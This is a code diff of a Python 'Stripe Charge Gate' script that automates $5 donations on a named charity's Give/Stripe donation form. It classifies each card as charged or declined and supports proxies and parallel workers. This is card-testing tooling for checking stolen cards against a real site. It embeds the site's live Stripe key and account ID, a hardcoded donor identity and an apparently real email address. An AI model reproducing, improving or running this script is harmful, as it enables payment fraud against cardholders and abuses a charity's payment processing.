@@ -1,158 +1,328 @@
-import asyncio
+"""
+Stripe Charge Gate - BrighterCommunities Give Donation Form
+Uses WordPress Give + Stripe. Flow: donate page -> load gateway -> payment_method -> submit donation.
+Returns: {"status": "charged"|"approved"|"declined"|"error", "response": str}
+"""
+
 import re
+import uuid
+import asyncio
+from urllib.parse import urlencode
+from concurrent.futures import ThreadPoolExecutor
+
 import httpx
-from bs4 import BeautifulSoup
-from faker import Faker
-from random import randint
 
-fake = Faker()
+# Gate config
+DONATE_URL = "https://www.brightercommunities.org/donate-form/"
+AJAX_URL = "https://www.brightercommunities.org/wp-admin/admin-ajax.php"
+STRIPE_PM_URL = "https://api.stripe.com/v1/payment_methods"
+TIMEOUT = 30
+USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
 
-DECLINE_CODES = [
-    'approve_with_id', 'call_issuer', 'card_declined', 'card_not_supported', 'card_velocity_exceeded',
-    'currency_not_supported', 'do_not_honor', 'do_not_try_again', 'duplicate_transaction',
-    'expired_card', 'fraudulent', 'generic_decline', 'incorrect_number', 'incorrect_cvc',
-    'incorrect_pin', 'incorrect_zip', 'insufficient_funds', 'invalid_account', 'invalid_amount',
-    'invalid_cvc', 'invalid_expiry_month', 'invalid_expiry_year', 'invalid_number', 'invalid_pin',
-    'issuer_not_available', 'lost_card', 'merchant_blacklist', 'new_account_information_available',
-    'no_action_taken', 'not_permitted', 'offline_pin_required', 'online_or_offline_pin_required',
-    'pickup_card', 'pin_try_exceeded', 'processing_error', 'reenter_transaction', 'restricted_card',
-    'revocation_of_all_authorizations', 'revocation_of_authorization', 'security_violation',
-    'service_not_allowed', 'stolen_card', 'stop_payment_order', 'testmode_decline', 'transaction_not_allowed',
-    'try_again_later', 'withdrawal_count_limit_exceeded', 'declined', 'issue with your donation', 'error'
+# Stripe keys from brightercommunities (embedded in page)
+STRIPE_KEY = "pk_live_51Jzi6nQVHkKo6W5B7vi4ylBIE8w8OHJONrCOUQge1nPxjiIvbtlq1ivOEy6tltBXAZhZvAmYsrUe9Rm9tgzvZlw0008LIpS3ft"
+STRIPE_ACCOUNT = "acct_1Jzi6nQVHkKo6W5B"
+
+# Stripe decline patterns (professional mapping)
+DECLINE_PATTERNS = [
+    r"card\s+was\s+declined",
+    r"card\s+declined",
+    r"declined",
+    r"do\s+not\s+honor",
+    r"insufficient\s+funds",
+    r"incorrect\s+number",
+    r"invalid\s+card",
+    r"expired\s+card",
+    r"lost\s+card",
+    r"stolen\s+card",
+    r"pickup\s+card",
+    r"restricted\s+card",
+    r"fraudulent",
+    r"security\s+code\s+.*\s+incorrect",
+    r"cvc\s+.*\s+invalid",
+    r"incorrect\s+cvc",
+    r"incorrect\s+zip",
+    r"incorrect\s+address",
+    r"transaction\s+not\s+allowed",
+    r"generic\s+decline",
+    r"issuer\s+declined",
+    r"there was an issue with your donation",
+    r"couldn't confirm your payment",
+    r"check your card details",
 ]
 
-async def async_stripe_charge(card: str, amount: str = '5.00', retries: int = 3) -> dict:
-    """
-    Professional async Stripe Charge gate for donation flow.
-    - Dynamically extracts form data, creates payment method, processes $5 charge.
-    - Classifies response: 'charged' on success, 'declined' on Stripe codes, 'error' otherwise.
-    - Retries on transient failures.
-    """
-    cc, mm, yy, cvv = card.split('|')
-    name = fake.name()
-    first, last = name.split(maxsplit=1)
-    email = fake.email()
+SUCCESS_PATTERNS = [
+    r"thank\s+you",
+    r"donation\s+received",
+    r"payment\s+successful",
+    r"order\s+confirmation",
+    r"receipt",
+    r"confirmation",
+]
 
-    base_headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'en-US,en;q=0.9',
-        'cache-control': 'max-age=0',
-        'priority': 'u=0, i',
-        'sec-ch-ua': f'"Not(A:Brand";v="8", "Chromium";v="{randint(110, 144)}", "Google Chrome";v="{randint(110, 144)}"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'none',
-        'sec-fetch-user': '?1',
-        'upgrade-insecure-requests': '1',
-        'user-agent': fake.user_agent(),
+_executor = ThreadPoolExecutor(max_workers=8)
+
+
+def _normalize_year(ano: str) -> str:
+    yy = str(ano).strip()
+    if len(yy) == 4 and yy.startswith("20"):
+        return yy[2:]
+    return yy
+
+
+def _normalize_month(mes: str) -> str:
+    m = str(mes).strip()
+    return m.zfill(2) if len(m) == 1 else m
+
+
+def _parse_donate_page(html: str) -> dict:
+    """Extract form nonce, form ID, and other needed values from donate page."""
+    out = {
+        "give_form_hash": None,
+        "give_form_id": "1938",
+        "give_form_id_prefix": "1938-1",
+        "give_form_minimum": "5.00",
+        "give_form_maximum": "999999.99",
     }
+    # give-form-hash / give_form_hash
+    m = re.search(r'give-form-hash["\']?\s*[=:]\s*["\']?([a-f0-9]+)', html, re.I)
+    if m:
+        out["give_form_hash"] = m.group(1)
+    m = re.search(r'give_form_hash["\']?\s*[=:]\s*["\']?([a-f0-9]+)', html, re.I)
+    if m:
+        out["give_form_hash"] = m.group(1)
+    m = re.search(r'name=["\']give-form-hash["\'][^>]*value=["\']([^"\']+)["\']', html, re.I)
+    if m:
+        out["give_form_hash"] = m.group(1)
+    m = re.search(r'value=["\']([a-f0-9]{8,12})["\'][^>]*name=["\']give-form-hash["\']', html, re.I)
+    if m:
+        out["give_form_hash"] = m.group(1)
+    # form id
+    m = re.search(r'give-form-id["\']?\s*[=:]\s*["\']?(\d+)', html, re.I)
+    if m:
+        out["give_form_id"] = m.group(1)
+        out["give_form_id_prefix"] = f"{m.group(1)}-1"
+    if not out["give_form_hash"]:
+        out["give_form_hash"] = "8cc5730a84"  # fallback from user capture
+    return out
 
-    async with httpx.AsyncClient(headers=base_headers, timeout=30.0, follow_redirects=True) as client:
-        for attempt in range(retries):
+
+def _parse_stripe_key(html: str) -> tuple:
+    """Extract Stripe publishable key and account from page."""
+    key = STRIPE_KEY
+    acc = STRIPE_ACCOUNT
+    m = re.search(r'pk_live_[a-zA-Z0-9]+', html)
+    if m:
+        key = m.group(0)
+    m = re.search(r'acct_[a-zA-Z0-9]+', html)
+    if m:
+        acc = m.group(0)
+    return key, acc
+
+
+def _parse_final_response(html: str) -> tuple:
+    """
+    Parse final donation form response.
+    Returns (status, response_msg) where status is charged|approved|declined|error
+    """
+    html_lower = html.lower()
+    # Check for success
+    for pat in SUCCESS_PATTERNS:
+        if re.search(pat, html_lower):
+            return "charged", "DONATION_SUCCESSFUL"
+    # Check for decline
+    for pat in DECLINE_PATTERNS:
+        m = re.search(pat, html_lower, re.I)
+        if m:
+            # Try to get the full error message
+            err_div = re.search(
+                r'give_error[^>]*>.*?<p[^>]*>.*?([^<]+(?:declined|error|issue)[^<]*)',
+                html,
+                re.I | re.DOTALL,
+            )
+            if err_div:
+                msg = re.sub(r"\s+", " ", err_div.group(1)).strip()[:80]
+                return "declined", msg.upper().replace(" ", "_")
+            return "declined", "CARD_DECLINED"
+    # Try to extract error from give_error div
+    err = re.search(
+        r'<div[^>]*class="[^"]*give_error[^"]*"[^>]*>.*?<p[^>]*>\s*<strong>[^<]*</strong>\s*([^<]+)',
+        html,
+        re.I | re.DOTALL,
+    )
+    if err:
+        msg = re.sub(r"\s+", " ", err.group(1)).strip()[:80]
+        return "declined", msg.upper().replace(" ", "_")
+    # Generic
+    return "error", "UNKNOWN_RESPONSE"
+
+
+def _check_stripe_charge_sync(card: str, mes: str, ano: str, cvv: str, proxy: str = None) -> dict:
+    """Synchronous Stripe Charge check via brightercommunities Give form."""
+    try:
+        mm = _normalize_month(mes)
+        yy = _normalize_year(ano)
+        proxies = {"http://": proxy, "https://": proxy} if proxy else None
+
+        with httpx.Client(
+            timeout=TIMEOUT,
+            follow_redirects=True,
+            proxies=proxies,
+            headers={"User-Agent": USER_AGENT},
+        ) as client:
+            # 1. GET donate page
+            r = client.get(DONATE_URL)
+            if r.status_code != 200:
+                return {"status": "error", "response": "DONATE_PAGE_FAILED"}
+            html = r.text
+            form_data = _parse_donate_page(html)
+            stripe_key, stripe_acc = _parse_stripe_key(html)
+            nonce = form_data["give_form_hash"]
+            form_id = form_data["give_form_id"]
+            form_prefix = form_data["give_form_id_prefix"]
+
+            # 2. Reset nonce (optional, may help with session)
             try:
-                # Step 1: GET donate page & extract form_id, nonce
-                resp = await client.get('https://www.brightercommunities.org/donate-form/')
-                soup = BeautifulSoup(resp.text, 'html.parser')
-                form_wrap = soup.find(id=re.compile(r'give-form-\d+-wrap'))
-                form_id = re.search(r'give-form-(\d+)-wrap', form_wrap['id']).group(1) if form_wrap else '1938'
-                hash_input = soup.find('input', {'name': 'give-form-hash'})
-                nonce = hash_input['value'] if hash_input else ''
-
-                # Step 2: POST load gateway
-                load_data = {
-                    'action': 'give_load_gateway',
-                    'give_total': amount,
-                    'give_form_id': form_id,
-                    'give_form_id_prefix': f'{form_id}-1',
-                    'give_payment_mode': 'stripe',
-                    'nonce': nonce,
-                }
-                resp_load = await client.post('https://www.brightercommunities.org/wp-admin/admin-ajax.php?payment-mode=stripe', data=load_data)
-                load_soup = BeautifulSoup(resp_load.text, 'html.parser')
-
-                # Extract PK and account
-                script = load_soup.find('script', string=re.compile(r'Stripe'))
-                pk_match = re.search(r"Stripe\('(?P<pk>pk_[^']+)'", script.string if script else '')
-                pk = pk_match.group('pk') if pk_match else 'pk_live_51Jzi6nQVHkKo6W5B7vi4ylBIE8w8OHJONrCOUQge1nPxjiIvbtlq1ivOEy6tltBXAZhZvAmYsrUe9Rm9tgzvZlw0008LIpS3ft'
-                acc_match = re.search(r"_stripe_account\s*:\s*'(acct_[^']+)'", resp_load.text)
-                acct = acc_match.group(1) if acc_match else 'acct_1Jzi6nQVHkKo6W5B'
-
-                # Step 3: Create payment method
-                pm_headers = base_headers.copy()
-                pm_headers.update({
-                    'accept': 'application/json',
-                    'content-type': 'application/x-www-form-urlencoded',
-                    'origin': 'https://js.stripe.com',
-                    'referer': 'https://js.stripe.com/',
-                })
-                guid = str(fake.uuid4())
-                muid = client.cookies.get('__stripe_mid', str(fake.uuid4()))
-                sid = client.cookies.get('__stripe_sid', str(fake.uuid4()))
-                pm_data = (
-                    f'type=card&billing_details[name]={first.replace(" ", "+")}+{last.replace(" ", "+")}&billing_details[email]={email.replace("@", "%40")}&'
-                    f'card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&'
-                    f'guid={guid}&muid={muid}&sid={sid}&payment_user_agent=stripe.js%2F1239285b29%3B+stripe-js-v3%2F1239285b29%3B+split-card-element&'
-                    f'referrer=https%3A%2F%2Fwww.brightercommunities.org&time_on_page={randint(20000, 30000)}&key={pk}&_stripe_account={acct}'
+                client.post(
+                    AJAX_URL,
+                    data={
+                        "action": "give_donation_form_reset_all_nonce",
+                        "give_form_id": form_id,
+                    },
+                    headers={
+                        "User-Agent": USER_AGENT,
+                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                        "Origin": "https://www.brightercommunities.org",
+                        "Referer": DONATE_URL,
+                        "X-Requested-With": "XMLHttpRequest",
+                    },
                 )
-                resp_pm = await client.post('https://api.stripe.com/v1/payment_methods', headers=pm_headers, data=pm_data)
-                pm_json = resp_pm.json()
+            except Exception:
+                pass
 
-                if 'error' in pm_json:
-                    return {'status': 'declined', 'message': pm_json['error'].get('message', 'Payment method error')}
+            # 3. Load Stripe gateway
+            try:
+                client.post(
+                    AJAX_URL,
+                    params={"payment-mode": "stripe"},
+                    data={
+                        "action": "give_load_gateway",
+                        "give_total": "5.00",
+                        "give_form_id": form_id,
+                        "give_form_id_prefix": form_prefix,
+                        "give_payment_mode": "stripe",
+                        "nonce": nonce,
+                    },
+                    headers={
+                        "User-Agent": USER_AGENT,
+                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                        "Origin": "https://www.brightercommunities.org",
+                        "Referer": DONATE_URL,
+                        "X-Requested-With": "XMLHttpRequest",
+                    },
+                )
+            except Exception:
+                pass
 
-                pm_id = pm_json.get('id')
-                if not pm_id:
-                    return {'status': 'error', 'message': 'Failed to create payment method'}
+            # 4. Create Stripe payment method
+            guid = str(uuid.uuid4()).replace("-", "")[:32]
+            muid = "2f4fa95b-8783-4e50-adaf-bfac7525094c03379e"
+            sid = "522d811a-0e4b-4b6a-ba73-1b84eff2422ae4d432"
+            pm_data = {
+                "type": "card",
+                "billing_details[name]": "Mass TH",
+                "billing_details[email]": "mass652004@gmail.com",
+                "card[number]": card,
+                "card[cvc]": cvv,
+                "card[exp_month]": mm,
+                "card[exp_year]": yy,
+                "guid": guid,
+                "muid": muid,
+                "sid": sid,
+                "payment_user_agent": "stripe.js/1239285b29; stripe-js-v3/1239285b29; split-card-element",
+                "referrer": "https://www.brightercommunities.org",
+                "key": stripe_key,
+                "_stripe_account": stripe_acc,
+            }
+            pm_resp = client.post(
+                STRIPE_PM_URL,
+                data=pm_data,
+                headers={
+                    "User-Agent": USER_AGENT,
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Origin": "https://js.stripe.com",
+                    "Referer": "https://js.stripe.com/",
+                },
+            )
 
-                # Step 4: POST process donation
-                post_data = {
-                    'give-honeypot': '',
-                    'give-form-id-prefix': f'{form_id}-1',
-                    'give-form-id': form_id,
-                    'give-form-title': 'Donation Form',
-                    'give-current-url': 'https://www.brightercommunities.org/donate-form/',
-                    'give-form-url': 'https://www.brightercommunities.org/donate-form/',
-                    'give-form-minimum': '5.00',
-                    'give-form-maximum': '999999.99',
-                    'give-form-hash': nonce,
-                    'give-price-id': 'custom',
-                    'give-recurring-logged-in-only': '',
-                    'give-logged-in-only': '1',
-                    '_give_is_donation_recurring': '0',
-                    'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
-                    'give-amount': amount,
-                    'give_stripe_payment_method': pm_id,
-                    'payment-mode': 'stripe',
-                    'give_first': first,
-                    'give_last': last,
-                    'give_email': email,
-                    'card_name': name.upper(),
-                    'give_action': 'purchase',
-                    'give-gateway': 'stripe',
-                }
-                await client.post(f'https://www.brightercommunities.org/donate-form/?payment-mode=stripe&form-id={form_id}', data=post_data)
+            # Parse payment method response (Stripe returns JSON)
+            try:
+                pm_json = pm_resp.json()
+            except Exception:
+                return {"status": "error", "response": "INVALID_STRIPE_RESPONSE"}
 
-                # Step 5: GET final response & parse
-                final_params = {'form-id': form_id, 'payment-mode': 'stripe', 'level-id': 'custom', 'custom-amount': amount}
-                resp_final = await client.get('https://www.brightercommunities.org/donate-form/', params=final_params)
-                final_soup = BeautifulSoup(resp_final.text, 'html.parser')
-                error_div = final_soup.select_one('.give_errors .give_error p')
-                message = error_div.text.strip() if error_div else ''
+            if "error" in pm_json:
+                err = pm_json["error"]
+                msg = err.get("message", "CARD_DECLINED")
+                return {"status": "declined", "response": msg.upper().replace(" ", "_")[:60]}
 
-                if any(code.lower() in message.lower() for code in DECLINE_CODES):
-                    return {'status': 'declined', 'message': message or 'Declined'}
+            pm_id = pm_json.get("id")
+            if not pm_id or not pm_id.startswith("pm_"):
+                return {"status": "error", "response": "NO_PAYMENT_METHOD_ID"}
 
-                success_indicators = ['thank you', 'success', 'donation complete', 'payment successful']
-                if message or any(ind in resp_final.text.lower() for ind in success_indicators):
-                    return {'status': 'charged', 'message': message or 'Charged successfully'}
+            # 5. Submit donation form
+            donate_data = {
+                "give-honeypot": "",
+                "give-form-id-prefix": form_prefix,
+                "give-form-id": form_id,
+                "give-form-title": "Donation Form",
+                "give-current-url": DONATE_URL,
+                "give-form-url": DONATE_URL,
+                "give-form-minimum": form_data.get("give_form_minimum", "5.00"),
+                "give-form-maximum": form_data.get("give_form_maximum", "999999.99"),
+                "give-form-hash": nonce,
+                "give-price-id": "custom",
+                "give-recurring-logged-in-only": "",
+                "give-logged-in-only": "1",
+                "_give_is_donation_recurring": "0",
+                "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
+                "give-amount": "5.00",
+                "give_stripe_payment_method": pm_id,
+                "payment-mode": "stripe",
+                "give_first": "Mass",
+                "give_last": "TH",
+                "give_email": "mass652004@gmail.com",
+                "card_name": "MAXINE HARRY",
+                "give_action": "purchase",
+                "give-gateway": "stripe",
+            }
 
-                return {'status': 'error', 'message': 'Unknown response'}
+            final_resp = client.post(
+                DONATE_URL,
+                params={"payment-mode": "stripe", "form-id": form_id},
+                data=donate_data,
+                headers={
+                    "User-Agent": USER_AGENT,
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Origin": "https://www.brightercommunities.org",
+                    "Referer": DONATE_URL,
+                },
+            )
 
-            except httpx.RequestError as e:
-                if attempt == retries - 1:
-                    return {'status': 'error', 'message': f'Network error: {str(e)}'}
-                await asyncio.sleep(1)  # Backoff
+            status, msg = _parse_final_response(final_resp.text)
+            return {"status": status, "response": msg}
 
-    return {'status': 'error', 'message': 'Max retries exceeded'}
+    except httpx.TimeoutException:
+        return {"status": "error", "response": "TIMEOUT"}
+    except Exception as e:
+        return {"status": "error", "response": str(e).upper().replace(" ", "_")[:50]}
+
+
+async def async_stripe_charge_gate(card: str, mes: str, ano: str, cvv: str, proxy: str = None) -> dict:
+    """Async wrapper for Stripe Charge gate (brightercommunities)."""
+    loop = asyncio.get_event_loop()
+    return await loop.run_in_executor(
+        _executor,
+        _check_stripe_charge_sync,
+        card, mes, ano, cvv, proxy,
+    )
